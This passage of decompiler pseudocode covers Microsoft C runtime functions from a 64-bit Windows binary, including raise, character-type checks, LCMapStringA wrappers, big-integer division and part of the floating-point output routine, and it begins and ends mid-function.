  v0 = (int (__cdecl *)(size_t))__ROR8__(qword_14001DB80 ^ _security_cookie, _security_cookie & 0x3F);
  sub_14000ABB0(0);
  return v0;
}


// ===== ??$?RV_lambda_c36588078e9f5dfd39652860aa6b3aaf_@@AEAV_lambda_ec61778202f4f5fc7e7711acc23c3bca_@@V_lambda_dc9d2797ccde5d239b4a0efae8ebd7db_@@@?$__crt_seh_guarded_call@P6AXH@Z@@QEAAP6AXH@Z$$QEAV_lambda_c36588078e9f5dfd39652860aa6b3aaf_@@AEAV_lambda_ec61778202f4f5fc7e7711acc23c3bca_@@$$QEAV_lambda_dc9d2797ccde5d239b4a0efae8ebd7db_@@@Z @ 0x14000ba10 size=0x45 =====
__int64 __fastcall __crt_seh_guarded_call<void (*)(int)>::operator()<_lambda_c36588078e9f5dfd39652860aa6b3aaf_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_dc9d2797ccde5d239b4a0efae8ebd7db_>(
        __int64 a1,
        int *a2,
        __int64 a3,
        int *a4)
{
  __int64 v5; // rbx

  sub_14000AB5C(*a2);
  v5 = __ROR8__(qword_14001DB98 ^ _security_cookie, _security_cookie & 0x3F);
  sub_14000ABB0(*a4);
  return v5;
}


// ===== __acrt_get_sigabrt_handler @ 0x14000ba58 size=0x2e =====
__int64 _acrt_get_sigabrt_handler()
{
  __int64 v1; // [rsp+30h] [rbp+8h] BYREF
  int v2; // [rsp+38h] [rbp+10h] BYREF
  int v3; // [rsp+40h] [rbp+18h] BYREF

  v2 = 3;
  v3 = 3;
  return __crt_seh_guarded_call<void (*)(int)>::operator()<_lambda_c36588078e9f5dfd39652860aa6b3aaf_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_dc9d2797ccde5d239b4a0efae8ebd7db_>(
           (__int64)&v1,
           &v3,
           (__int64)&v1,
           &v2);
}


// ===== __acrt_initialize_signal_handlers @ 0x14000ba88 size=0x1d =====
void __fastcall _acrt_initialize_signal_handlers(__int64 a1)
{
  qword_14001DB88 = a1;
  qword_14001DB90 = a1;
  qword_14001DB98 = a1;
  qword_14001DBA0 = a1;
}


// ===== raise @ 0x14000baa8 size=0x299 =====
int __cdecl raise(int Signal)
{
  struct __acrt_ptd *v2; // r13
  char v3; // si
  struct __acrt_ptd *v4; // rax
  __int64 i; // rcx
  __int64 *v7; // rbx
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  int v11; // ecx
  void (__fastcall *v12)(_QWORD); // r15
  int v13; // r12d
  __int64 v14; // rax
  __int64 v15; // rcx
  struct __acrt_ptd *v16; // rbx
  int v17; // [rsp+90h] [rbp+18h]
  __int64 v18; // [rsp+98h] [rbp+20h]

  v2 = nullptr;
  v17 = 0;
  v3 = 1;
  if ( Signal != 2 )
  {
    switch ( Signal )
    {
      case 4:
        goto LABEL_9;
      case 6:
        goto LABEL_19;
      case 8:
      case 11:
LABEL_9:
        v4 = _acrt_getptd_noexit();
        v2 = v4;
        if ( v4 == nullptr )
          return -1;
        for ( i = *(_QWORD *)v4; i != *(_QWORD *)v4 + 192LL; i += 16 )
        {
          if ( *(_DWORD *)(i + 4) == Signal )
            goto LABEL_16;
        }
        i = 0;
LABEL_16:
        if ( i == 0 )
        {
LABEL_17:
          *errno() = 22;
          invalid_parameter_noinfo();
          return -1;
        }
        v7 = (__int64 *)(i + 8);
        v3 = 0;
        goto LABEL_29;
      default:
        break;
    }
    if ( Signal != 15 && (unsigned int)(Signal - 21) > 1 )
      goto LABEL_17;
  }
LABEL_19:
  v8 = Signal - 2;
  if ( v8 != 0 )
  {
    v9 = v8 - 4;
    if ( v9 == 0 )
    {
LABEL_25:
      v7 = &qword_14001DB98;
      goto LABEL_29;
    }
    v10 = v9 - 9;
    if ( v10 != 0 )
    {
      v11 = v10 - 6;
      if ( v11 != 0 )
      {
        if ( v11 != 1 )
        {
          v7 = nullptr;
          goto LABEL_29;
        }
        goto LABEL_25;
      }
      v7 = &qword_14001DB90;
    }
    else
    {
      v7 = &qword_14001DBA0;
    }
  }
  else
  {
    v7 = &qword_14001DB88;
  }
LABEL_29:
  v18 = 0;
  if ( v3 != 0 )
  {
    sub_14000AB5C(3);
    v12 = (void (__fastcall *)(_QWORD))__ROR8__(*v7 ^ _security_cookie, _security_cookie & 0x3F);
  }
  else
  {
    v12 = (void (__fastcall *)(_QWORD))*v7;
  }
  if ( v12 == (void (__fastcall *)(_QWORD))1 )
  {
    v13 = 2320;
    goto LABEL_47;
  }
  if ( v12 == nullptr )
  {
    if ( v3 != 0 )
      sub_14000ABB0(3);
    exit(3);
  }
  v13 = 2320;
  if ( (unsigned int)Signal > 0xB || !_bittest(&v13, Signal) )
    goto LABEL_41;
  v18 = *((_QWORD *)v2 + 1);
  *((_QWORD *)v2 + 1) = 0;
  if ( Signal == 8 )
  {
    v17 = *((_DWORD *)_acrt_getptd() + 4);
    *((_DWORD *)_acrt_getptd() + 4) = 140;
LABEL_41:
    if ( Signal == 8 )
    {
      v14 = *(_QWORD *)v2 + 48LL;
      v15 = *(_QWORD *)v2 + 192LL;
      while ( v14 != v15 )
      {
        *(_QWORD *)(v14 + 8) = 0;
        v14 += 16;
      }
      goto LABEL_47;
    }
  }
  *v7 = _security_cookie ^ __ROR8__(0, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
LABEL_47:
  if ( v3 != 0 )
    sub_14000ABB0(3);
  if ( v12 != (void (__fastcall *)(_QWORD))1 )
  {
    if ( Signal == 8 )
    {
      v16 = _acrt_getptd();
      guard_check_icall_nop();
      ((void (__fastcall *)(__int64, _QWORD))v12)(8, *((unsigned int *)v16 + 4));
    }
    else
    {
      guard_check_icall_nop();
      v12((unsigned int)Signal);
    }
    if ( (unsigned int)Signal <= 0xB )
    {
      if ( _bittest(&v13, Signal) )
      {
        *((_QWORD *)v2 + 1) = v18;
        if ( Signal == 8 )
          *((_DWORD *)_acrt_getptd() + 4) = v17;
      }
    }
  }
  return 0;
}


// ===== iswctype @ 0x14000bd44 size=0x70 =====
int __cdecl iswctype(wint_t C, wctype_t Type)
{
  WORD v4; // ax
  WORD CharType; // [rsp+30h] [rbp+8h] BYREF
  WCHAR SrcStr; // [rsp+40h] [rbp+18h] BYREF

  if ( C == 0xFFFF )
    return 0;
  if ( C >= 0x100u )
  {
    SrcStr = C;
    CharType = 0;
    if ( !GetStringTypeW(1u, &SrcStr, 1, &CharType) )
      return 0;
    v4 = CharType;
  }
  else
  {
    v4 = *((_WORD *)off_14001C810 + C);
  }
  return Type & v4;
}


// ===== _isctype_l @ 0x14000bdb4 size=0x10f =====
int __cdecl isctype_l(int C, int Type, _locale_t Locale)
{
  __int64 v4; // rdi
  int v5; // eax
  int v6; // r9d
  int result; // eax
  CHAR MultiByteStr; // [rsp+40h] [rbp-40h] BYREF
  char v9; // [rsp+41h] [rbp-3Fh]
  char v10; // [rsp+42h] [rbp-3Eh]
  __int64 v11; // [rsp+48h] [rbp-38h] BYREF
  __crt_locale_pointers Localea; // [rsp+50h] [rbp-30h] BYREF
  char v13; // [rsp+60h] [rbp-20h]
  WORD CharType[2]; // [rsp+68h] [rbp-18h] BYREF
  __int16 v15; // [rsp+6Ch] [rbp-14h]

  v4 = C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v11, Locale);
  if ( (unsigned int)(v4 + 1) <= 0x100 )
  {
    v5 = *(unsigned __int16 *)(*(_QWORD *)Localea.locinfo + 2 * v4);
    goto LABEL_11;
  }
  if ( isleadbyte_l(BYTE1(v4), &Localea) != 0 )
  {
    MultiByteStr = BYTE1(v4);
    v6 = 2;
    v9 = v4;
    v10 = 0;
  }
  else
  {
    MultiByteStr = v4;
    v6 = 1;
    v9 = 0;
  }
  *(_DWORD *)CharType = 0;
  v15 = 0;
  if ( (unsigned int)_acrt_GetStringTypeA(
                       &Localea,
                       1u,
                       &MultiByteStr,
                       v6,
                       CharType,
                       *((_DWORD *)Localea.locinfo + 3),
                       1) != 0 )
  {
    v5 = CharType[0];
LABEL_11:
    result = Type & v5;
    if ( v13 != 0 )
      *(_DWORD *)(v11 + 936) &= ~2u;
    return result;
  }
  if ( v13 != 0 )
    *(_DWORD *)(v11 + 936) &= ~2u;
  return 0;
}


// ===== _isleadbyte_l @ 0x14000bec4 size=0x3f =====
int __cdecl isleadbyte_l(int C, _locale_t Locale)
{
  unsigned __int8 v2; // bl
  int result; // eax
  _QWORD v4[3]; // [rsp+20h] [rbp-28h] BYREF
  char v5; // [rsp+38h] [rbp-10h]

  v2 = C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v4, Locale);
  result = *(_WORD *)(*(_QWORD *)v4[1] + 2LL * v2) & 0x8000;
  if ( v5 != 0 )
    *(_DWORD *)(v4[0] + 936LL) &= ~2u;
  return result;
}


// ===== ?__acrt_LCMapStringA_stat@@YAHPEAU__crt_locale_pointers@@PEB_WKPEBDHPEADHHH@Z @ 0x14000bf04 size=0x35b =====
int __fastcall __acrt_LCMapStringA_stat(
        struct __crt_locale_pointers *a1,
        const wchar_t *a2,
        DWORD a3,
        const char *a4,
        int a5,
        char *a6,
        int a7,
        UINT CodePage,
        int a9)
{
  int v9; // ebx
  int v13; // eax
  UINT v14; // r14d
  int result; // eax
  int v16; // r12d
  unsigned __int64 v17; // rdx
  unsigned __int64 v18; // rax
  unsigned __int64 v19; // rcx
  __int64 v20; // rax
  void *v21; // rsp
  WCHAR *v22; // rsi
  WCHAR *v23; // rax
  const wchar_t *v24; // r15
  int v25; // eax
  int v26; // edi
  unsigned __int64 v27; // rdx
  unsigned __int64 v28; // rax
  unsigned __int64 v29; // rcx
  __int64 v30; // rax
  void *v31; // rsp
  WCHAR *v32; // rbx
  WCHAR *v33; // rax
  _BYTE v34[32]; // [rsp+0h] [rbp-50h] BYREF
  LPWSTR lpWideCharStr; // [rsp+20h] [rbp-30h]
  int cchWideChar; // [rsp+28h] [rbp-28h]
  LPCCH v37; // [rsp+30h] [rbp-20h]
  LPBOOL v38; // [rsp+38h] [rbp-18h]
  const wchar_t *v39; // [rsp+50h] [rbp+0h] BYREF

  v9 = a5;
  v39 = a2;
  if ( a5 > 0 )
  {
    v13 = _strncnt(a4, a5);
    v9 = v13 + 1;
    if ( v13 >= a5 )
      v9 = v13;
  }
  v14 = CodePage;
  if ( CodePage == 0 )
    v14 = *((_DWORD *)a1->locinfo + 3);
  result = MultiByteToWideChar(v14, a9 != 0 ? 9 : 1, a4, v9, nullptr, 0);
  v16 = result;
  if ( result != 0 )
  {
    v17 = 2LL * result;
    if ( (-(__int64)(v17 < v17 + 16) & (v17 + 16)) == 0 )
    {
      v22 = nullptr;
      goto LABEL_17;
    }
    v18 = v17 + 16;
    if ( ((v17 + 16) & -(__int64)(v17 < v17 + 16)) > 0x400 )
    {
      v23 = (WCHAR *)malloc_base(v18 & -(__int64)(v17 < v18));
      v22 = v23;
      if ( v23 == nullptr )
      {
LABEL_17:
        if ( v22 != nullptr && MultiByteToWideChar(v14, 1u, a4, v9, v22, v16) != 0 )
        {
          v24 = v39;
          v25 = _acrt_LCMapStringEx((__int64)v39, a3, v22, v16, nullptr, 0, 0, 0, 0);
          v26 = v25;
          if ( v25 != 0 )
          {
            if ( (a3 & 0x400) != 0 )
            {
              if ( a7 == 0 )
                goto LABEL_43;
              if ( v25 <= a7 )
              {
                v26 = _acrt_LCMapStringEx((__int64)v24, a3, v22, v16, (WCHAR *)a6, a7, 0, 0, 0);
                if ( v26 != 0 )
                  goto LABEL_43;
              }
              goto LABEL_42;
            }
            v27 = 2LL * v25;
            if ( (-(__int64)(v27 < v27 + 16) & (v27 + 16)) == 0 )
            {
              v32 = nullptr;
LABEL_35:
              if ( v32 != nullptr )
              {
                if ( _acrt_LCMapStringEx((__int64)v24, a3, v22, v16, v32, v26, 0, 0, 0) != 0 )
                {
                  v38 = nullptr;
                  v37 = nullptr;
                  if ( a7 != 0 )
                  {
                    cchWideChar = a7;
                    lpWideCharStr = (LPWSTR)a6;
                  }
                  else
                  {
                    cchWideChar = 0;
                    lpWideCharStr = nullptr;
                  }
                  v26 = WideCharToMultiByte(v14, 0, v32, v26, (LPSTR)lpWideCharStr, cchWideChar, v37, v38);
                  if ( v26 != 0 )
                  {
                    if ( *((_DWORD *)v32 - 4) == 56797 )
                      free_base(v32 - 8);
                    goto LABEL_43;
                  }
                }
                if ( *((_DWORD *)v32 - 4) == 56797 )
                  free_base(v32 - 8);
              }
              goto LABEL_42;
            }
            v28 = v27 + 16;
            if ( ((v27 + 16) & -(__int64)(v27 < v27 + 16)) > 0x400 )
            {
              v33 = (WCHAR *)malloc_base(v28 & -(__int64)(v27 < v28));
              v32 = v33;
              if ( v33 == nullptr )
                goto LABEL_35;
              *(_DWORD *)v33 = 56797;
              goto LABEL_33;
            }
            v29 = v28 & -(__int64)(v27 < v28);
            v30 = v29 + 15;
            if ( v29 + 15 < v29 )
              v30 = 0xFFFFFFFFFFFFFF0LL;
            v31 = alloca(v30 & 0xFFFFFFFFFFFFFFF0uLL);
            v32 = (WCHAR *)&v39;
            if ( v34 != (_BYTE *)-80LL )
            {
              LODWORD(v39) = 52428;
LABEL_33:
              v32 += 8;
              goto LABEL_35;
            }
          }
        }
LABEL_42:
        v26 = 0;
LABEL_43:
        if ( v22 != nullptr && *((_DWORD *)v22 - 4) == 56797 )
          free_base(v22 - 8);
        return v26;
      }
      *(_DWORD *)v23 = 56797;
    }
    else
    {
      v19 = v18 & -(__int64)(v17 < v18);
      v20 = v19 + 15;
      if ( v19 + 15 < v19 )
        v20 = 0xFFFFFFFFFFFFFF0LL;
      v21 = alloca(v20 & 0xFFFFFFFFFFFFFFF0uLL);
      v22 = (WCHAR *)&v39;
      if ( v34 == (_BYTE *)-80LL )
        goto LABEL_42;
      LODWORD(v39) = 52428;
    }
    v22 += 8;
    goto LABEL_17;
  }
  return result;
}


// ===== __acrt_LCMapStringA @ 0x14000c260 size=0x96 =====
int __fastcall _acrt_LCMapStringA(
        struct __crt_locale_pointers *a1,
        wchar_t *a2,
        DWORD a3,
        char *a4,
        int a5,
        char *a6,
        int a7,
        UINT a8,
        int a9)
{
  int result; // eax
  __int64 v13; // [rsp+50h] [rbp-28h] BYREF
  struct __crt_locale_pointers v14; // [rsp+58h] [rbp-20h] BYREF
  char v15; // [rsp+68h] [rbp-10h]

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v13, a1);
  result = __acrt_LCMapStringA_stat(&v14, a2, a3, a4, a5, a6, a7, a8, a9);
  if ( v15 != 0 )
    *(_DWORD *)(v13 + 936) &= ~2u;
  return result;
}


// ===== __acrt_fp_strflt_to_string @ 0x14000c2f8 size=0xbf =====
__int64 __fastcall _acrt_fp_strflt_to_string(__int64 a1, unsigned __int64 a2, int a3, __int64 a4)
{
  int *v4; // rax
  unsigned int v5; // ebx
  int v7; // eax
  char *v8; // rdx
  char *v9; // rax
  char v10; // r10
  __int64 v11; // r8

  if ( a1 != 0 && a2 != 0 )
  {
    *(_BYTE *)a1 = 0;
    v7 = 0;
    if ( a3 > 0 )
      v7 = a3;
    if ( a2 <= v7 + 1 )
    {
      v4 = errno();
      v5 = 34;
      goto LABEL_3;
    }
    if ( a4 != 0 )
    {
      v8 = *(char **)(a4 + 8);
      v9 = (char *)(a1 + 1);
      *(_BYTE *)a1 = 48;
      while ( a3 > 0 )
      {
        v10 = *v8;
        if ( *v8 != 0 )
          ++v8;
        else
          v10 = 48;
        *v9++ = v10;
        --a3;
      }
      *v9 = 0;
      if ( a3 >= 0 && *v8 >= 53 )
      {
        while ( *--v9 == 57 )
          *v9 = 48;
        ++*v9;
      }
      if ( *(_BYTE *)a1 == 49 )
      {
        ++*(_DWORD *)(a4 + 4);
      }
      else
      {
        v11 = -1;
        do
          ++v11;
        while ( *(_BYTE *)(a1 + v11 + 1) != 0 );
        sub_1400036D0((__m128i *)a1, (const __m128i *)(a1 + 1), v11 + 1);
      }
      return 0;
    }
  }
  v4 = errno();
  v5 = 22;
LABEL_3:
  *v4 = v5;
  invalid_parameter_noinfo();
  return v5;
}


// ===== ?divide@__crt_strtox@@YA_KAEAUbig_integer@1@AEBU21@@Z @ 0x14000c3c0 size=0x4ce =====
__int64 __fastcall __crt_strtox::divide(
        __crt_strtox *this,
        struct __crt_strtox::big_integer *a2,
        const struct __crt_strtox::big_integer *a3)
{
  __int64 v6; // r9
  unsigned int v7; // eax
  unsigned __int64 v8; // r15
  int v9; // r14d
  unsigned int v10; // ebx
  unsigned int v11; // ebx
  __int64 v12; // rdi
  unsigned __int64 v13; // rbp
  __int64 v14; // rax
  unsigned __int64 v15; // rtt
  __int64 v16; // rdx
  int v17; // r8d
  unsigned int v18; // r13d
  int v19; // r10d
  __int64 v20; // r11
  _DWORD *v21; // rcx
  unsigned int v22; // r10d
  unsigned int v23; // ebx
  bool v24; // zf
  int v25; // edx
  char v26; // r11
  unsigned int v27; // r10d
  unsigned int v28; // ebx
  int v29; // ebx
  __int64 v30; // r15
  __int64 v31; // rdi
  unsigned __int64 v32; // r11
  unsigned int v33; // ebp
  unsigned int v34; // r10d
  unsigned __int64 v35; // r8
  unsigned __int64 v36; // rax
  unsigned __int64 v37; // rcx
  __int64 v38; // r8
  unsigned __int64 v39; // rdx
  unsigned __int64 v40; // rcx
  unsigned int v41; // edx
  unsigned int *v42; // r9
  __int64 i; // rbx
  unsigned __int64 v44; // rcx
  unsigned int v45; // r10d
  char *v46; // r11
  unsigned int v47; // eax
  unsigned __int64 v48; // r9
  unsigned int v49; // r10d
  char *v50; // r11
  __int64 j; // rbx
  __int64 v52; // rdx
  char *v53; // rcx
  unsigned __int64 v54; // rdx
  unsigned int v55; // r9d
  unsigned int k; // ecx
  __int64 v57; // rax
  __int64 v58; // rdx
  char v59; // [rsp+20h] [rbp-238h]
  unsigned __int64 v60; // [rsp+28h] [rbp-230h]
  unsigned __int64 v61; // [rsp+30h] [rbp-228h]
  char v62; // [rsp+38h] [rbp-220h]
  _BYTE Source[468]; // [rsp+44h] [rbp-214h] BYREF
  int v64; // [rsp+260h] [rbp+8h]
  int v66; // [rsp+270h] [rbp+18h]
  unsigned int v67; // [rsp+278h] [rbp+20h]

  if ( *(_DWORD *)this == 0 || *(_DWORD *)a2 == 0 )
    return 0;
  v6 = (unsigned int)(*(_DWORD *)this - 1);
  v7 = *(_DWORD *)a2 - 1;
  if ( *(_DWORD *)a2 == 1 )
  {
    v8 = *((unsigned int *)a2 + 1);
    v9 = 0;
    if ( (_DWORD)v8 == 1 )
    {
      v10 = *((_DWORD *)this + 1);
      *(_DWORD *)this = 0;
      memcpy_s((char *)this + 4, 0x1CCu, Source, 0);
      return v10;
    }
    else if ( *(_DWORD *)this == 1 )
    {
      v11 = *((_DWORD *)this + 1);
      *(_DWORD *)this = 0;
      memcpy_s((char *)this + 4, 0x1CCu, Source, 0);
      *((_DWORD *)this + 1) = v11 % (unsigned int)v8;
      LOBYTE(v9) = v11 % (unsigned int)v8 != 0;
      *(_DWORD *)this = v9;
      return v11 / (unsigned int)v8;
    }
    else
    {
      v12 = 0;
      v13 = 0;
      if ( *(_DWORD *)this != 0 )
      {
        do
        {
          v14 = *((unsigned int *)this + v6 + 1);
          v6 = (unsigned int)(v6 - 1);
          v15 = (v13 << 32) | v14;
          v13 = v15 % v8;
          v12 = (unsigned int)(v15 / v8) + (v12 << 32);
        }
        while ( (_DWORD)v6 != -1 );
      }
      *(_DWORD *)this = 0;
      memcpy_s((char *)this + 4, 0x1CCu, Source, 0);
      *(_QWORD *)((char *)this + 4) = v13;
      LOBYTE(v9) = HIDWORD(v13) != 0;
      *(_DWORD *)this = v9 + 1;
      return v12;
    }
  }
  else if ( v7 <= (unsigned int)v6 )
  {
    v16 = (int)v6;
    v17 = v6 - v7;
    v18 = v7 + 1;
    v19 = *(_DWORD *)this - 1;
    if ( (int)v6 < (__int64)(int)(v6 - v7) )
      goto LABEL_20;
    v20 = (struct __crt_strtox::big_integer *)((char *)a2 - 4 * v17) - this;
    v21 = (_DWORD *)((char *)this + 4 * (int)v6 + 4);
    while ( *(_DWORD *)((char *)v21 + v20) == *v21 )
    {
      --v19;
      --v16;
      --v21;
      if ( v16 < v17 )
        goto LABEL_20;
    }
    if ( *((_DWORD *)a2 + v19 - (__int64)v17 + 1) < *((_DWORD *)this + v19 + 1) )
LABEL_20:
      ++v17;
    if ( v17 != 0 )
    {
      v22 = *((_DWORD *)a2 + v7 + 1);
      v23 = *((_DWORD *)a2 + v7);
      v24 = !_BitScanReverse(&v7, v22);
      v67 = *((_DWORD *)a2 + v18 - 1);
      if ( v24 )
        v25 = 32;
      else
        v25 = 31 - v7;
      v26 = 32 - v25;
      v66 = v25;
      v59 = 32 - v25;
      if ( v25 != 0 )
      {
        v27 = v23 >> v26;
        v28 = v23 << v25;
        v22 = (*((_DWORD *)a2 + v18) << v25) | v27;
        v67 = v28;
        if ( v18 > 2 )
          v67 = (*((_DWORD *)a2 + v18 - 2) >> v26) | v28;
      }
      v29 = v17 - 1;
      v64 = v17 - 1;
      v30 = 0;
      if ( v17 - 1 >= 0 )
      {
        v31 = v29 + v18;
        v32 = v22;
        v61 = v22;
        v62 = 32 - v25;
        do
        {
          if ( (unsigned int)v31 > (unsigned int)v6 )
            v33 = 0;
          else
            v33 = *((_DWORD *)this + v31 + 1);
          v34 = *((_DWORD *)this + (unsigned int)(v31 - 2) + 1);
          LODWORD(v60) = *((_DWORD *)this + (unsigned int)(v31 - 1) + 1);
          HIDWORD(v60) = v33;
          if ( v25 != 0 )
          {
            v35 = (v60 << v25) | ((unsigned __int64)v34 >> v62);
            v34 <<= v25;
            if ( (unsigned int)v31 >= 3 )
              v34 |= *((_DWORD *)this + (unsigned int)(v31 - 3) + 1) >> v59;
          }
          else
          {
            v35 = v60;
          }
          v36 = v35 / v32;
          v37 = (unsigned int)(v35 % v32);
          v38 = v36;
          if ( v36 > 0xFFFFFFFF )
          {
            v38 = 0xFFFFFFFFLL;
            v37 += v32 * (v36 - 0xFFFFFFFF);
          }
          if ( v37 <= 0xFFFFFFFF )
          {
            v39 = v38 * v67;
            do
            {
              if ( v39 <= (v34 | (v37 << 32)) )
                break;
              --v38;
              v39 -= v67;
              v37 += v61;
            }
            while ( v37 <= 0xFFFFFFFF );
            v29 = v64;
          }
          if ( v38 != 0 )
          {
            v40 = 0;
            if ( v18 != 0 )
            {
              v41 = v29;
              v42 = (unsigned int *)((char *)a2 + 4);
              for ( i = v18; i != 0; --i )
              {
                v44 = v38 * *v42 + v40;
                v45 = v44;
                v40 = HIDWORD(v44);
                v46 = (char *)this + 4 * v41;
                v47 = *((_DWORD *)v46 + 1);
                if ( v47 < v45 )
                  ++v40;
                ++v41;
                ++v42;
                *((_DWORD *)v46 + 1) = v47 - v45;
              }
              v29 = v64;
            }
            if ( v33 < v40 )
            {
              LODWORD(v48) = 0;
              if ( v18 != 0 )
              {
                v49 = v29;
                v50 = (char *)a2 + 4;
                for ( j = v18; j != 0; --j )
                {
                  v50 += 4;
                  v52 = *((unsigned int *)this + v49 + 1);
                  v53 = (char *)this + 4 * v49++;
                  v54 = (unsigned int)v48 + *((unsigned int *)v50 - 1) + v52;
                  *((_DWORD *)v53 + 1) = v54;
                  v48 = HIDWORD(v54);
                }
              }
              LODWORD(v38) = v38 - 1;
            }
            v29 = v64;
            LODWORD(v6) = v31 - 1;
          }
          v32 = v61;
          --v29;
          v25 = v66;
          v31 = (unsigned int)(v31 - 1);
          v30 = (unsigned int)v38 + (v30 << 32);
          v64 = v29;
        }
        while ( v29 >= 0 );
      }
      v55 = v6 + 1;
      for ( k = v55; k < *(_DWORD *)this; *((_DWORD *)this + v57 + 1) = 0 )
        v57 = k++;
      *(_DWORD *)this = v55;
      if ( v55 != 0 )
      {
        do
        {
          v58 = (unsigned int)(*(_DWORD *)this - 1);
          if ( *((_DWORD *)this + v58 + 1) != 0 )
            break;
          *(_DWORD *)this = v58;
        }
        while ( (_DWORD)v58 != 0 );
      }
      return v30;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    return 0;
  }
}


// ===== __acrt_fltout @ 0x14000c890 size=0x136b =====
int __fastcall _acrt_fltout(__int64 a1, int a2, __int64 a3, char *a4, rsize_t SizeInBytes)
{
  __int64 v8; // rbx
  __int64 v9; // rax
  __int64 v10; // rax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  __int64 v15; // xmm0_8
  unsigned __int64 v16; // r8
  unsigned __int64 v17; // r14
  int v18; // ebx
  double v19; // xmm0_8
  unsigned __int64 v20; // r8
  double v21; // xmm0_8
  unsigned __int64 v22; // r14
  int v23; // r12d
  unsigned int v24; // edx
  unsigned int v25; // r11d
  unsigned int v26; // r9d
  int v27; // ebx
  bool v28; // zf
  int v29; // eax
  int v30; // eax
  unsigned int v31; // edi
  unsigned int v32; // eax
  bool v33; // r15
  char v34; // cl
  unsigned int v35; // r14d
  __int64 v36; // rdi
  __int32 v37; // r10d
  __int64 v38; // rax
  __int32 v39; // edx
  unsigned int i; // ecx
  __int64 v41; // rax
  unsigned int v42; // r15d
  unsigned int v43; // r11d
  unsigned int v44; // r9d
  int v45; // ebx
  int v46; // eax
  int v47; // eax
  unsigned int v48; // edi
  unsigned int v49; // eax
  bool v50; // r12
  bool v51; // cl
  __int64 v52; // rdi
  __int32 v53; // r10d
  __int64 v54; // rax
  __int32 v55; // edx
  unsigned int j; // ecx
  __int64 v57; // rax
  int v58; // r8d
  int v59; // eax
  int v60; // eax
  unsigned int v61; // edi
  unsigned int v62; // ecx
  __int32 v63; // r8d
  __int64 v64; // rax
  unsigned __int32 v65; // edx
  __int64 v66; // rax
  int v67; // eax
  int v68; // eax
  int v69; // edi
  char v70; // al
  unsigned int v71; // ecx
  __int32 v72; // r8d
  __int64 v73; // rax
  unsigned __int32 v74; // edx
  __int64 v75; // rax
  char v76; // di
  unsigned int v77; // esi
  __int64 v78; // rbx
  unsigned int v79; // eax
  unsigned int v80; // r12d
  int v81; // r13d
  __int64 v82; // rax
  __int64 v83; // rsi
  unsigned __int64 v84; // rbx
  unsigned int v85; // r11d
  __int64 v86; // r10
  __int64 v87; // r9
  unsigned __int64 v88; // rcx
  char v89; // al
  __int64 v90; // rbx
  __int64 v91; // r9
  unsigned __int64 v92; // rcx
  unsigned int v93; // r12d
  __m128i *v94; // r13
  __m128i *v95; // rdx
  __int64 v96; // r10
  __int64 v97; // rsi
  unsigned __int64 v98; // rbx
  unsigned int v99; // r9d
  __int64 v100; // rdx
  unsigned __int64 v101; // rdx
  __int64 v102; // rcx
  unsigned __int64 v103; // rdx
  int v104; // edi
  int v105; // eax
  unsigned int v106; // eax
  unsigned int v107; // r9d
  __int64 v108; // rdx
  unsigned __int64 v109; // rcx
  unsigned int v110; // ecx
  unsigned int v111; // eax
  unsigned int v112; // r12d
  int v113; // r13d
  __int64 v114; // rax
  __int64 v115; // rsi
  unsigned __int64 v116; // rbx
  unsigned int v117; // edi
  __int64 v118; // r10
  __int64 v119; // r9
  unsigned __int64 v120; // rcx
  char v121; // al
  __int64 v122; // rbx
  __int64 v123; // r9
  unsigned __int64 v124; // rcx
  unsigned int v125; // r12d
  __m128i *v126; // r13
  __m128i *v127; // rdx
  __int64 v128; // r10
  __int64 v129; // rsi
  unsigned __int64 v130; // rbx
  unsigned int v131; // r9d
  __int64 v132; // rdx
  unsigned __int64 v133; // rdx
  __int64 v134; // rcx
  unsigned __int64 v135; // rdx
  unsigned int v136; // ecx
  unsigned int v137; // eax
  unsigned int v138; // r9d
  __int64 v139; // rdx
  unsigned __int64 v140; // rcx
  char *v141; // rsi
  char *v142; // rbx
  unsigned int v143; // r9d
  __int64 v144; // rdx
  unsigned __int64 v145; // r8
  int v146; // eax
  unsigned __int64 v147; // r8
  unsigned int v148; // r9d
  __int64 v149; // rdx
  unsigned __int64 v150; // r8
  unsigned int v151; // ecx
  rsize_t v152; // rdi
  char *k; // rdi
  unsigned int v154; // r10d
  const struct __crt_strtox::big_integer *v155; // r8
  unsigned int v156; // r9d
  __int64 v157; // rdx
  unsigned __int64 v158; // rcx
  unsigned int v159; // r8d
  unsigned int m; // r9d
  char v161; // cl
  int v163; // [rsp+30h] [rbp-D0h]
  __m128i *X; // [rsp+38h] [rbp-C8h] BYREF
  unsigned int v165; // [rsp+40h] [rbp-C0h]
  int v166; // [rsp+44h] [rbp-BCh]
  unsigned int v167; // [rsp+48h] [rbp-B8h]
  unsigned int v168; // [rsp+4Ch] [rbp-B4h]
  char *v169; // [rsp+50h] [rbp-B0h]
  __int64 v170; // [rsp+58h] [rbp-A8h]
  fenv_t Env; // [rsp+60h] [rbp-A0h] BYREF
  char v172; // [rsp+68h] [rbp-98h]
  __int64 v173; // [rsp+70h] [rbp-90h]
  unsigned int v174; // [rsp+80h] [rbp-80h] BYREF
  __m128i Destination[28]; // [rsp+84h] [rbp-7Ch] BYREF
  unsigned int v176; // [rsp+250h] [rbp+150h] BYREF
  __m128i v177; // [rsp+254h] [rbp+154h] BYREF
  unsigned int v178; // [rsp+420h] [rbp+320h]
  __m128i Source[28]; // [rsp+424h] [rbp+324h] BYREF
  unsigned int v180; // [rsp+5F0h] [rbp+4F0h]
  __m128i v181; // [rsp+5F4h] [rbp+4F4h] BYREF

  X = (__m128i *)a1;
  v169 = a4;
  v173 = a3;
  fegetenv(&Env);
  if ( (Env._Fe_ctl & 0x1F) == 0x1F )
  {
    v172 = 0;
  }
  else
  {
    feholdexcept(&Env);
    v172 = 1;
  }
  v8 = (__int64)X;
  v9 = (__int64)X;
  *(_QWORD *)(a3 + 8) = a4;
  *(_DWORD *)a3 = v9 < 0 ? 45 : 32;
  if ( (v8 & 0x7FF0000000000000LL) == 0 && (v8 & 0xFFFFFFFFFFFFFLL) == 0 )
